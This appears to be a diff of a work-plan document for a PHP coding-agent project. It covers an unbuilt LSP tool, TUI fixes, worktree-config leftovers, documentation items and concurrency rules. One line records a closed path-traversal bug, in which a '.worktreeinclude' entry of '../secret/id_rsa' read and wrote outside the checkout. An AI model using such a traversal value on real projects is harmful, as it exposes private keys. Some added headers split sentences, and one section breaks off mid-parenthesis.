-  The plan says "add `implements Tool`"; there is no `src/Tools/LspTool.php` at all, and
-  measured 2026-08-19 the **whole `src/LSP/` subsystem has zero production users** — the grep
-  for `LspConnection`/`new LspClient` outside `src/LSP/` is empty. So the item is four pieces
-  of work, not one: write the tool; choose its surface over `LspClient`'s
-  definitions/references/hover/symbols/codeActions/diagnostics API; construct a connection
-  (`LspConnection::connect()` **spawns the server with `proc_open`**, so this needs server
-  discovery/config); and degrade when no language server is installed, which is the common
-  case and the real design work. **Its own bundle — do not fold it into C1.** Note
   `connect()`'s `float $timeout = 30.0` is a language-server request timeout, NOT an LLM
   completion timeout, so the no-blanket-timeout directive does not apply to it — say that in
   the brief so nobody "fixes" it. Full measurement in `/tmp/…/scratchpad/c1-measured.md`.
-- **D** Phase 3 items 2-5 — `candy-focus\FocusRing` in `Tui\Pane`; `sugar-veil`
-  `withClickOutsideDismiss()`; `candy-sprinkles\Table`; `strlen()` padding fixes.
-- **E** Phase 6 items 1-6 — **item 1's `__DIR__` bug is largely already fixed**, so do
-  not brief it as the cheap opener. Measured 2026-08-19: `WorktreeConfig`'s old
-  `__DIR__ . '/../../../.sugar-crush/config.json'` read is now the named seam
-  `defaultConfigDir()` (`\dirname(__DIR__, 3)`) with `ContainedPath` gating in three
-  places, and its docblock records the measured escape it closed (a `.worktreeinclude`
-  line of `../secret/id_rsa` read AND wrote outside the checkout). What is genuinely left
-  is the half that file explicitly defers: `dirname(__DIR__, 3)` is the directory
-  CONTAINING the package, which under a composer install is `vendor/sugarcraft/` and not
-  where anyone's config lives — point it at the project root / user config dir the way
+
+### E-row doctrine — DORMANT IS NOT UNGATED
+*(was §11, lines 6667–6668 (item 46))*
+
   `Bootstrap` does. Also still true: nothing in `src/` constructs a `WorktreeManager`, so
   wiring it is part of the item ("DORMANT IS NOT UNGATED" is that file's own doctrine).
-  Then: layered settings files; `tools.allow`/`deny`; permission block;
-  keybindings + statusLine; `--model`/`--permission-mode` flags.
-- **F** Phase 7 items 3-6 — the authoring/reference docs. Also fix README's stale
-  built-in-hooks list (omits `BashEscapeDenyHook`).
-- **G** Phase 8 items 3,4,6,8,9,10,11,13,15 — `StallDetector` render branch (only the
-  paint is left); split-pane compositor fate; VHS demos; repo-map; `Grep`'s missing
-  `InstructionFileLoader` wiring; proactive git diff in `EnvironmentBlock`;
-  `loadRoot()` monorepo-parent awareness; `Task` tool (epic); file-watching (note only).
-- **Phase 2 item 9** — unified `crush-plugin.json` + `PluginLoader`. Explicitly the
-  deferred larger half; do after items 1-7.
-- **LAST — the hardening pass:** `docs/plans/crush_code_hardening_backlog.md`, 50+
-  items and growing as each round appends.
+
+### concurrency: the authority pointer and the two surviving §0b rules (item 30, condensed)
+*(was §0b, lines 5537–5538 and 5559–5562)*
+
+**`docs/plans/crush_code_concurrency.md` is the authority.** Read its §0 and §1 and
+nothing else unless you are changing the map. It carries the mode switch (ON, OFF, and
+
+
+
+4. **No lane ever commits a `.vhs/*.gif`.** CI regenerates and pushes them after every
+   batch of changes, so master drift is guaranteed, not occasional. Since GIFs are binary
+   a rebase conflict there is not hand-mergeable — and since no lane writes them, it can
+   never happen. `git pull --rebase` before every push is routine, not defensive.
+
+---
+
+## HISTORY POINTER
+
+Full round-by-round history lives in `git log` of this repository, the round blocks in
+`docs/plans/crush_code_worklog.md`, and this file's own git ancestry; nothing else. Rules are durable;
+figures are not.
